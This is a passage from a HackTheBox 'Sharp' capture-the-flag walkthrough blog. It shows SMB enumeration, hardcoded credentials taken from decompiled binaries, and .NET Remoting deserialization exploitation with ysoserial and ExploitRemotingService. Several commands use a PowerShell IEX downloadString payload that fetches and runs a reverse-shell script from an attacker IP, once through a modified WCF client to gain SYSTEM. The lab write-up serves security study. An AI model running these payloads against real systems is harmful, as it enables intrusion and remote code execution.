<p>While searching <code class="language-plaintext highlighter-rouge">lars</code> files, only those in <code class="language-plaintext highlighter-rouge">\\dev</code> seem important.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚îå‚îÄ‚îÄ<span class="o">(</span>rootüíÄkali<span class="o">)</span>-[/home/‚Ä¶/HackTheBox/Sharp/smb/lars]
‚îî‚îÄ# smbclient <span class="nt">-U</span> <span class="s1">'lars'</span> //10.10.10.219/dev G123HHrth234gRG                                    130 ‚®Ø
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sun Nov 15 06:30:13 2020
  ..                                  D        0  Sun Nov 15 06:30:13 2020
  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020
  notes.txt                           A       70  Sun Nov 15 08:59:02 2020
  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020
  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020
  
<span class="c"># notes.txt</span>
Todo:
    Migrate from .Net remoting to WCF	<span class="c"># This might be our hint</span>
    Add input validation
</code></pre></div></div>

<p>Two executables <code class="language-plaintext highlighter-rouge">Client.exe</code> and <code class="language-plaintext highlighter-rouge">Server.exe</code>, as well as their library, are also built in C#  so we can decompile them with dnSpy.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-02.png" alt="" /></p>

<p>Then we have a <em>secret</em> endpoint listening on port <code class="language-plaintext highlighter-rouge">8888</code> with its username and password hardcoded in <code class="language-plaintext highlighter-rouge">Client.exe</code></p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-06.png" alt="Client.exe" /></p>

<p>The credentials are to be tested with CME whether they are valid.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-12.png" alt="" /></p>

<h3 id="credentials-acquired-1">Credentials acquired</h3>

<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
      <th>Status</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>debug</td>
      <td>SharpApplicationDebugUserPassword123!</td>
      <td>Valid</td>
    </tr>
    <tr>
      <td>Administrator</td>
      <td>G2@$btRSHJYTarg</td>
      <td>Invalid</td>
    </tr>
    <tr>
      <td>lars</td>
      <td>G123HHrth234gRG</td>
      <td>Valid</td>
    </tr>
  </tbody>
</table>

<h2 id="exploit-local-net-debug-service">Exploit local .NET debug service</h2>

<p>As <code class="language-plaintext highlighter-rouge">debug</code> profile contains nothing but some useless folders (<code class="language-plaintext highlighter-rouge">IPC$</code>, <code class="language-plaintext highlighter-rouge">dev</code> and similarities for lars), we have to figure out how to connect to the endpoint on port 8888. Back to the <code class="language-plaintext highlighter-rouge">notes.txt</code>, I thought there is something to do with the .NET service and came across these two repos. You can take a look yourselves.</p>

<p>https://github.com/tyranid/ExploitRemotingService</p>

<blockquote>
  <p>A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149. It only works on Windows although some aspects <em>might</em> work in Mono on *nix.</p>
</blockquote>

<p>https://github.com/frohoff/ysoserial (basically our payload wrapper)</p>

<blockquote>
  <p><strong>ysoserial</strong> is a collection of utilities and property-oriented programming ‚Äúgadget chains‚Äù discovered in common java libraries that can, under the right conditions, exploit Java applications performing <strong>unsafe deserialization</strong> of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host</p>
</blockquote>

<p>We will use <em>ysoserial</em> to wrap our reverse-tcp PowerShell one-liner<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup> and call <em>ExploitRemotingService.exe</em> to pipe our wrapped payload into the mentioned vulnerable endpoint.</p>

<h3 id="payload-crafting-and-network-configuration">Payload crafting and Network configuration</h3>

<h4 id="useful-poc-repositories">Useful PoC<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup> repositories</h4>

<p>Because ExploitRemotingService doesn‚Äôt provide us any release versions so we have to download and build the project manually with Visual Studio on our Windows VM<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>.</p>

<p>Additionally, I have to install <a href="http://www.ndesk.org/Options">NDesk Options</a> library in order to successfully compile the solution.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-27.png" alt="" /></p>

<p><code class="language-plaintext highlighter-rouge">ysoserial</code> has their portable version so we can simply download, unzip and use it.</p>

<p>Here is a brief look of <code class="language-plaintext highlighter-rouge">Server.exe</code> source code decompiled by dnSpy. The server is running on port <code class="language-plaintext highlighter-rouge">8888</code> with BinaryFormatter sink implemented. You can read about the details <a href="https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting.channels.binaryserverformattersink?view=netframework-4.8">here</a>; simply put, we just need <code class="language-plaintext highlighter-rouge">ysoserial</code> to wrap our payload in BinaryFormatter mode.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-41.png" alt="" /></p>

<p>Below is our crafting steps with <code class="language-plaintext highlighter-rouge">ysoserial</code> and <code class="language-plaintext highlighter-rouge">ExploitRemotingService</code>:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">### ysoserial.exe</span><span class="w">
</span><span class="n">C:\Users\User\Desktop\ysoserial-1.34\Release</span><span class="err">&gt;</span><span class="nx">ysoserial.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">BinaryFormatter</span><span class="w"> </span><span class="nt">-g</span><span class="w"> </span><span class="nx">TypeConfuseDelegate</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"powershell IEX(new-object net.webclient).downloadString('http://10.10.16.3/reverse.ps1')"</span><span class="w">

</span><span class="c"># Breakdown</span><span class="w">
</span><span class="nt">-f</span><span class="w"> </span><span class="n">Formatter</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">BinaryFormatter</span><span class="w">
</span><span class="nt">-g</span><span class="w"> </span><span class="n">TypeConfuseDelegate</span><span class="w"> </span><span class="nx">gadget</span><span class="w">
</span><span class="nt">-o</span><span class="w"> </span><span class="n">Base64</span><span class="w"> </span><span class="nx">output</span><span class="w">
</span><span class="nt">-c</span><span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">reverse</span><span class="w"> </span><span class="nx">connection</span><span class="w"> </span><span class="nx">back</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">our</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">using</span><span class="w"> </span><span class="nx">Powershell</span><span class="w"> </span><span class="nx">one-liner</span><span class="w"> </span><span class="nx">called</span><span class="w"> </span><span class="nx">reverse.ps1</span><span class="w">
</span><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'http://10.10.16.3/reverse.ps1'</span><span class="p">)</span><span class="w">


</span><span class="c">### ExploitRemotingService.exe</span><span class="w">
</span><span class="n">C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release</span><span class="err">&gt;</span><span class="nx">ExploitRemotingService.exe</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">--user</span><span class="o">=</span><span class="n">debug</span><span class="w"> </span><span class="nt">--pass</span><span class="o">=</span><span class="s2">"SharpApplicationDebugUserPassword123!"</span><span class="w"> </span><span class="n">tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint</span><span class="w"> </span><span class="nx">raw</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">wrapped</span><span class="w"> </span><span class="nx">payload</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<h4 id="network-re-routing-on-windows-and-linux">Network re-routing on Windows and Linux</h4>

<p>Before we can send our payload to target host, remember that currently our Linux machine is the only one can connect to HTB VPN, not our Windows. In order to establish a connection between Windows and HTB VPN, we have to do some routing.</p>

<p>The following section helps us turn Kali into a router and act as the gateway.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Windows</span>
<span class="c"># We want to route any HTB connection to our Kali machine NAT-IP</span>
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;route add 10.10.10.0 mask 255.255.255.0 192.168.157.133
 OK!

<span class="c">#	----------------------------------------------</span>

<span class="c"># Linux</span>
<span class="c"># Enable IP Forwarding</span>
<span class="nv">$ </span><span class="nb">echo </span>1 | <span class="nb">sudo tee</span> /proc/sys/net/ipv4/ip_forward 

<span class="c"># Configurate iptables' rules to manage incomming packets</span>
<span class="c"># This rule forwards packets from HTB to our Windows machine</span>
<span class="c"># Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state</span>
<span class="nv">$ </span>iptables <span class="nt">-A</span> FORWARD <span class="nt">-i</span> tun0 <span class="nt">-o</span> eth0 <span class="nt">-m</span> state <span class="nt">--state</span> RELATED,ESTABLISHED <span class="nt">-j</span> ACCEPT 

<span class="c"># Accept packets sending back from Windows machine</span>
<span class="c"># Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB</span>
<span class="nv">$ </span>iptables <span class="nt">-A</span> FORWARD <span class="nt">-i</span> eth0 <span class="nt">-o</span> tun0 <span class="nt">-j</span> ACCEPT

<span class="c"># Re-routing NAT from HTB machine back to Windows</span>
<span class="c"># Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy</span>
<span class="nv">$ </span>iptables <span class="nt">-t</span> nat <span class="nt">-A</span> POSTROUTING <span class="nt">-s</span> 192.168.157.0/24 <span class="nt">-o</span> tun0 <span class="nt">-j</span> MASQUERADE 
</code></pre></div></div>

<h3 id="powershell-reverse-connection">PowerShell Reverse Connection</h3>

<p>Finally, our Windows is able to send/receive packets from HTB machine through Kali.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_12-49.png" alt="" /></p>

<p>Now we can send our payload to target remote host and wait for our reverse shell.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">### ExploitRemotingService.exe</span>
C:<span class="se">\U</span>sers<span class="se">\U</span>ser<span class="se">\D</span>esktop<span class="se">\E</span>xploitRemotingService-master<span class="se">\E</span>xploitRemotingService<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease&gt;ExploitRemotingService.exe <span class="nt">-s</span> <span class="nt">--user</span><span class="o">=</span>debug <span class="nt">--pass</span><span class="o">=</span><span class="s2">"SharpApplicationDebugUserPassword123!"</span> tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &lt;wrapped payload&gt;
</code></pre></div></div>

<p>After execute the above command, we has established a reverse PowerShell as user <code class="language-plaintext highlighter-rouge">lars</code>.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_13-17.png" alt="" /></p>

<p>Browsing through <code class="language-plaintext highlighter-rouge">lars</code> directories, there is a <code class="language-plaintext highlighter-rouge">wcf</code> folder in Documents. This has also been mentioned in <code class="language-plaintext highlighter-rouge">notes.txt</code> about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine‚Äôs user flag is located in <code class="language-plaintext highlighter-rouge">C:\Users\lars\Desktop\user.txt</code>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents\wcf</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                  
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="o">.</span><span class="nf">vs</span><span class="w">                                                                   
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Client</span><span class="w">                                                                
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">packages</span><span class="w">                                                              
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:40</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">RemotingLibrary</span><span class="w">                                                       
</span><span class="n">d-----</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:41</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Server</span><span class="w">                                                                
</span><span class="nt">-a</span><span class="o">----</span><span class="w">       </span><span class="mi">11</span><span class="n">/15/2020</span><span class="w">  </span><span class="nx">12:47</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">2095</span><span class="w"> </span><span class="nx">wcf.sln</span><span class="w">                                                               


</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\lars\Documents\wcf</span><span class="err">&gt;</span><span class="w"> 
</span></code></pre></div></div>

<p>Let‚Äôs compress the wcf directory into <code class="language-plaintext highlighter-rouge">wcf.zip</code> then download it to our Linux shared directory</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-09.png" alt="" /></p>

<h3 id="another-secret-endpoint-and-flag">Another secret endpoint and ‚Ä¶flag!</h3>

<p>It turns out <code class="language-plaintext highlighter-rouge">wcf.zip</code> is also a C# project with source code inside, we can put it in Visual Studio and view the source. There is another secret endpoint that is currently running on port 8889 of the remote host.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-22.png" alt="" /></p>

<p>Since we are in the same network with remote target, you can try change the IP to the machine (10.10.10.219) and run the code. But there is a problem.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-29.png" alt="" /></p>

<p>We can‚Äôt connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like <code class="language-plaintext highlighter-rouge">lars</code> or <code class="language-plaintext highlighter-rouge">debug</code>). To impersonate <code class="language-plaintext highlighter-rouge">lars</code>, we will run our command-prompt with his net-username as following:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Also type lars password when prompted</span>
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;runas /user:lars /netonly %ComSpec%
</code></pre></div></div>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-33.png" alt="" /></p>

<p>Now we are <code class="language-plaintext highlighter-rouge">lars</code> in his server, move to our malformed <code class="language-plaintext highlighter-rouge">wcf</code> project and run it again.</p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-36.png" alt="" /></p>

<p>Successfully executed as <code class="language-plaintext highlighter-rouge">lars</code>. Now we will use the project‚Äôs built-in function <code class="language-plaintext highlighter-rouge">InvokePowerShell</code> to escalate our privilege.</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">public</span> <span class="kt">string</span> <span class="nf">InvokePowerShell</span><span class="p">(</span><span class="kt">string</span> <span class="n">scriptText</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Runspace</span> <span class="n">runspace</span> <span class="p">=</span> <span class="n">RunspaceFactory</span><span class="p">.</span><span class="nf">CreateRunspace</span><span class="p">();</span>
            <span class="n">runspace</span><span class="p">.</span><span class="nf">Open</span><span class="p">();</span>
            <span class="n">Pipeline</span> <span class="n">pipeline</span> <span class="p">=</span> <span class="n">runspace</span><span class="p">.</span><span class="nf">CreatePipeline</span><span class="p">();</span>
            <span class="n">pipeline</span><span class="p">.</span><span class="n">Commands</span><span class="p">.</span><span class="nf">AddScript</span><span class="p">(</span><span class="n">scriptText</span><span class="p">);</span>
            <span class="n">pipeline</span><span class="p">.</span><span class="n">Commands</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"Out-String"</span><span class="p">);</span>
            <span class="n">Collection</span> <span class="p">&lt;</span><span class="n">PSObject</span><span class="p">&gt;</span> <span class="n">results</span> <span class="p">=</span> <span class="n">pipeline</span><span class="p">.</span><span class="nf">Invoke</span><span class="p">();</span>
            <span class="n">runspace</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
            <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">();</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="n">PSObject</span> <span class="n">obj</span> <span class="k">in</span> <span class="n">results</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">AppendLine</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">stringBuilder</span><span class="p">.</span><span class="nf">ToString</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Client.cs</code> is to be changed as below:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">Client</span> <span class="p">{</span>

    <span class="k">public</span> <span class="k">class</span> <span class="nc">Client</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">ChannelFactory</span><span class="p">&lt;</span><span class="n">IWcfService</span><span class="p">&gt;</span> <span class="n">channelFactory</span> <span class="p">=</span> <span class="k">new</span> <span class="n">ChannelFactory</span><span class="p">&lt;</span><span class="n">IWcfService</span><span class="p">&gt;(</span>
                <span class="k">new</span> <span class="nf">NetTcpBinding</span><span class="p">(</span><span class="n">SecurityMode</span><span class="p">.</span><span class="n">Transport</span><span class="p">),</span><span class="s">"net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint"</span>
            <span class="p">);</span>
            <span class="n">IWcfService</span> <span class="n">client</span> <span class="p">=</span> <span class="n">channelFactory</span><span class="p">.</span><span class="nf">CreateChannel</span><span class="p">();</span>
            <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="nf">InvokePowerShell</span><span class="p">(</span><span class="s">"IEX(New-Object Net.WebClient).downloadString('10.10.16.3/reverse.ps1')"</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>Re-build the project then execute <code class="language-plaintext highlighter-rouge">Client.exe</code> as <code class="language-plaintext highlighter-rouge">lars</code> gives us our reverse shell as <code class="language-plaintext highlighter-rouge">nt-authority system</code></p>

<p><img src="https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-46.png" alt="" /></p>

<p>And the flag is located in <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop\root.txt</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="w">
</span><span class="n">dir</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                   
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                   
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">3D</span><span class="w"> </span><span class="nx">Objects</span><span class="w">                                                             
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Contacts</span><span class="w">                                                               
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:42</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Desktop</span><span class="w">                                                                
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/15/2020</span><span class="w">   </span><span class="nx">1:46</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Documents</span><span class="w">                                                              
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Downloads</span><span class="w">                                                              
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Favorites</span><span class="w">                                                              
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Links</span><span class="w">                                                                  
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Music</span><span class="w">                                                                  
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Pictures</span><span class="w">                                                               
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Saved</span><span class="w"> </span><span class="nx">Games</span><span class="w">                                                            
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Searches</span><span class="w">                                                               
</span><span class="n">d-r---</span><span class="w">       </span><span class="nx">11/12/2020</span><span class="w">   </span><span class="nx">5:15</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Videos</span><span class="w">                                                                 


</span><span class="n">cd</span><span class="w"> </span><span class="nx">Desktop</span><span class="w">
</span><span class="n">dir</span><span class="w">


    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="w">


</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                   
</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                   
</span><span class="nt">-ar</span><span class="o">---</span><span class="w">        </span><span class="mi">5</span><span class="n">/14/2021</span><span class="w">   </span><span class="nx">6:02</span><span class="w"> </span><span class="nx">AM</span><span class="w">             </span><span class="nx">34</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">                                                               


</span><span class="n">cat</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
</span><span class="p">[</span><span class="n">REDACTED</span><span class="p">]</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> 
</span></code></pre></div></div>

<h2 id="footnotes">Footnotes</h2>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1" role="doc-endnote">
      <p>See more about PowerShell one-liner: https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf¬†<a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:2" role="doc-endnote">
      <p>Proof of Concept¬†<a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:3" role="doc-endnote">
      <p>Virtual Machine¬†<a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

        </div>

        
          <div class="page-share">
  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Flegiahuyy.github.io%2Fblog%2Fen%2Fhackthebox%2FHTB-Sharp%2F" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--facebook btn--small"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i> <span>Share</span></a>
  <a href="https://twitter.com/intent/tweet?text=HackTheBox+-+Sharp%20https%3A%2F%2Flegiahuyy.github.io%2Fblog%2Fen%2Fhackthebox%2FHTB-Sharp%2F" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--twitter btn--small"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> <span>Tweet</span></a>
  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Flegiahuyy.github.io%2Fblog%2Fen%2Fhackthebox%2FHTB-Sharp%2F" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--linkedin btn--small"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> <span>LinkedIn</span></a>
  <a href="https://reddit.com/submit?title=HackTheBox+-+Sharp&url=https%3A%2F%2Flegiahuyy.github.io%2Fblog%2Fen%2Fhackthebox%2FHTB-Sharp%2F" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--reddit btn--small"><i class="fab fa-fw fa-reddit" aria-hidden="true"></i> <span>Reddit</span></a>
</div>

        

        

        <nav class="page-pagination" role="navigation">
  
    <a class="page-previous" href="/blog/en/ez-bof/">
      <h4 class="page-pagination-label">Previous</h4>
      <span class="page-pagination-title">
        <i class="fas fa-arrow-left"></i> KCSC - A simple BOF

      </span>
    </a>
  

  
    <a class="page-next" href="/blog/en/hackthebox/HTB-Armageddon/">
      <h4 class="page-pagination-label">Next</h4>
      <span class="page-pagination-title">
        HackTheBox - Armageddon
 <i class="fas fa-arrow-right"></i>
      </span>
    </a>
  
</nav>

      </div>
    </div>
  </article>
</main>


    <footer id="footer" class="site-footer">
  <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
<div class="social-icons"><a class="social-icon" href="https://twitter.com/0x7c00"><i class="fab fa-twitter-square fa-2x" title="Twitter"></i></a><a class="social-icon" href="/blog/en/atom.xml"><i class="fas fa-rss-square fa-2x" title="Feed"></i></a></div><div class="copyright">
    
      <p>This site is made with &lt;3 by <em>me, myself, and I</em>.</p>

    
  </div>
</footer>

    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
  <script src="/blog/en/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>


<!-- MathJax -->

<script>
// http://docs.mathjax.org/en/latest/upgrading/v2.html
MathJax = {
  tex: {
      tags: "ams"    // eq numbering options: none, ams, all
  },
  options: {
    renderActions: {
      // for mathjax 3, handle <script "math/tex"> blocks inserted by kramdown
      find: [10, function (doc) {
        for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
          const display = !!node.type.match(/; *mode=display/);
          const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
          const text = document.createTextNode('');
          node.parentNode.replaceChild(text, node);
          math.start = {node: text, delim: '', n: 0};
          math.end = {node: text, delim: '', n: 0};
          doc.math.push(math);
        }
      }, '']
    }
  }
}
</script>

<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script>

  </body>

</html>
